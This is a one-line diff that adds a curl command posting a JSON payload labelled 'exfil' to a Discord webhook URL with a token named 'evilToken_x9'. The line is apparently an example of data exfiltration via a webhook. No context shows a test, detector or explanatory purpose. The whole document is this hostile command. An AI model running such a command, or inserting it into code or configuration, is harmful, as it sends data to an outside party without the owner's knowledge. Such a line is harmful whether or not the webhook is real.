@@ -1,0 +1,1 @@
+curl -X POST -H 'Content-Type: application/json' -d '{"content":"exfil"}' https://discord.com/api/webhooks/1399999999999999999/evilToken_x9
